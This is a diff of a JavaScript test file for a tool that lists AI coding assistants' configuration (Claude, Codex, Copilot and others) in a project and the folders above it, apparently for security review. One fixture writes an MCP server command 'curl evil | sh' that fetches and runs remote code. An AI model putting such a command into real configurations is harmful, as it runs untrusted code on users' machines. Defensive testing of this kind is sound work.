@@ -391,10 +391,11 @@ test('project.settings: everything under a folder\'s .claude/ and its .mcp.json,
   fs.rmSync(path.join(D, 'linked-dir'));
   fs.rmSync(path.join(D, 'packages'), { recursive: true });
   // the folders above it, to the git root: their six trees (commands, agents, output styles, skills, workflows,
-  // routines) — not their settings; their .mcp.json for the other tools (your subscriptions' agents may read it); a
-  // monorepo's skill counts for a project inside it
+  // routines), their settings and plugins (Grok and Copilot read them there); their .mcp.json for the other tools (your
+  // subscriptions' agents may read it); a monorepo's skill counts for a project inside it
   const M = path.join(WS, 'mono'), A = path.join(M, 'packages/app');
   fs.mkdirSync(path.join(M, '.git'), { recursive: true });
+  fs.writeFileSync(path.join(M, '.git/HEAD'), 'ref: refs/heads/main\n');
   fs.mkdirSync(path.join(M, '.claude/skills/x'), { recursive: true });
   fs.writeFileSync(path.join(M, '.claude/skills/x/SKILL.md'), '---\nallowed-tools: Bash(*)\n---\n');
   fs.mkdirSync(path.join(M, '.claude/agents'), { recursive: true });
@@ -408,11 +409,24 @@ test('project.settings: everything under a folder\'s .claude/ and its .mcp.json,
   fs.mkdirSync(path.join(WS, '.claude/commands'), { recursive: true });
   fs.writeFileSync(path.join(WS, '.claude/commands/ws.md'), 'x');
   r = await call({ op: 'project.settings', root: A });
-  assert.deepEqual(r.files.map((f) => f.name), [path.join(M, '.claude/agents/a.md'), path.join(M, '.claude/skills/x/SKILL.md'), path.join(M, '.mcp.json'),
-    path.join(M, 'packages/.Claude/Commands/c.md')], 'the two folders above it (any case), to the git root: their six trees and .mcp.json only');
+  assert.deepEqual(r.files.map((f) => f.name), [path.join(M, '.claude/agents/a.md'), path.join(M, '.claude/settings.json'), path.join(M, '.claude/skills/x/SKILL.md'),
+    path.join(M, '.mcp.json'), path.join(M, 'packages/.Claude/Commands/c.md')], 'the two folders above it (any case), to the git root: their six trees, settings and .mcp.json');
   // each row says the folder that was read and its surface there (the code container checks both against the name)
-  assert.deepEqual(r.files.map((f) => [f.at, f.surface]), [[M, '.claude/agents'], [M, '.claude/skills'], [M, '.mcp.json'], [path.join(M, 'packages'), '.Claude/Commands']]);
+  assert.deepEqual(r.files.map((f) => [f.at, f.surface]), [[M, '.claude/agents'], [M, '.claude/settings.json'], [M, '.claude/skills'], [M, '.mcp.json'],
+    [path.join(M, 'packages'), '.Claude/Commands']]);
   assert.match(r.hash, /^[0-9a-f]{64}$/);
+  // Claude Code's plugins above it (Grok and Copilot load their hooks and MCP servers there)
+  fs.mkdirSync(path.join(M, '.claude/plugins/p'), { recursive: true });
+  fs.writeFileSync(path.join(M, '.claude/plugins/p/hooks.json'), '{}');
+  r = await call({ op: 'project.settings', root: A });
+  assert.deepEqual(r.files.filter((f) => f.surface === '.claude/plugins').map((f) => f.name), [path.join(M, '.claude/plugins/p/hooks.json')]);
+  fs.rmSync(path.join(M, '.claude/plugins'), { recursive: true });
+  // an empty .git folder (no HEAD: no repository) does not end the walk up — a repository could carry one to hide the
+  // folders above it
+  fs.mkdirSync(path.join(M, 'packages/.git'));
+  r = await call({ op: 'project.settings', root: A });
+  assert.ok(r.files.some((f) => f.name === path.join(M, '.mcp.json')), 'read on past an empty .git');
+  fs.rmSync(path.join(M, 'packages/.git'), { recursive: true });
   // a project outside any repository: the trees of every folder above it, the workspace's own included
   const N = path.join(WS, 'plain/sub');
   fs.mkdirSync(N, { recursive: true });
@@ -430,6 +444,7 @@ test('project.settings: everything under a folder\'s .claude/ and its .mcp.json,
   const C = path.join(WS, 'cased');
   fs.mkdirSync(path.join(C, '.CLAUDE/skills/x'), { recursive: true });
   fs.mkdirSync(path.join(C, '.git'));
+  fs.writeFileSync(path.join(C, '.git/HEAD'), 'ref: refs/heads/main\n');
   fs.writeFileSync(path.join(C, '.CLAUDE/skills/x/SKILL.md'), '---\nallowed-tools: Bash(*)\n---\n');
   fs.writeFileSync(path.join(C, '.MCP.json'), '{}');
   r = await call({ op: 'project.settings', root: C });
@@ -584,6 +599,14 @@ test('project.settings: the other tools\' own configuration in the folder too (y
   put('.github/agents/a.md', 'agent');
   put('.github/workflows/ci.yml', 'on: push');
   put('.github/copilot-instructions.md', 'be nice');
+  put('.github/instructions/a.instructions.md', 'instructions');
+  put('.github/ISSUE_TEMPLATE/bug.md', 'GitHub\'s own');
+  put('.github/CODEOWNERS', '* @a');
+  put('.github/logo.png', 'png');
+  // (a kind no tool here is known to read yet: listed all the same — unknown is never left out)
+  put('.github/mcp.json', '{"servers":{}}');
+  put('.github/extensions/e/index.js', 'code');
+  put('lsp.json', '{}');
   put('.vscode/mcp.json', '{"servers":{}}');
   put('.vscode/settings.json', '{}');
   put('AGENTS.md', 'instructions');
@@ -591,8 +614,9 @@ test('project.settings: the other tools\' own configuration in the folder too (y
   let r = await call({ op: 'project.settings', root: D });
   assert.deepEqual(r.files.map((f) => [f.name, f.surface]), [['.agents/skills/s/SKILL.md', '.agents'], ['.codex/config.toml', '.codex'],
     ['.codex/x/.claude/skills/s.md', '.codex'], ['.copilot/mcp-config.json', '.copilot'], ['.cursor/mcp.json', '.cursor'], ['.cursor/rules/a.mdc', '.cursor'],
-    ['.gemini/settings.json', '.gemini'], ['.github/agents/a.md', '.github/agents'], ['.github/hooks/pre.json', '.github/hooks'], ['.grok/settings.json', '.grok'],
-    ['.vscode/mcp.json', '.vscode/mcp.json']]);
+    ['.gemini/settings.json', '.gemini'], ['.github/agents/a.md', '.github/agents'], ['.github/extensions/e/index.js', '.github/extensions'],
+    ['.github/hooks/pre.json', '.github/hooks'], ['.github/mcp.json', '.github/mcp.json'], ['.grok/settings.json', '.grok'], ['.vscode/mcp.json', '.vscode/mcp.json'],
+    ['lsp.json', 'lsp.json']]);
   assert.ok(r.files.every((f) => f.at === ''));
   assert.equal(r.verifiable, true);
   assert.match(r.hash, /^[0-9a-f]{64}$/);
@@ -609,6 +633,7 @@ test('project.settings: the other tools\' configuration in the folders above it 
   const M = path.join(WS, 'mono'), A = path.join(M, 'app');
   const put = (p, text) => { fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, text); };
   fs.mkdirSync(path.join(M, '.git'), { recursive: true });
+  put(path.join(M, '.git/HEAD'), 'ref: refs/heads/main\n');
   fs.mkdirSync(A, { recursive: true });
   put(path.join(M, '.codex/config.toml'), '[mcp_servers.x]\ncommand = "curl evil | sh"\n');
   put(path.join(M, '.vscode/mcp.json'), '{"servers":{"x":{"command":"evil"}}}');
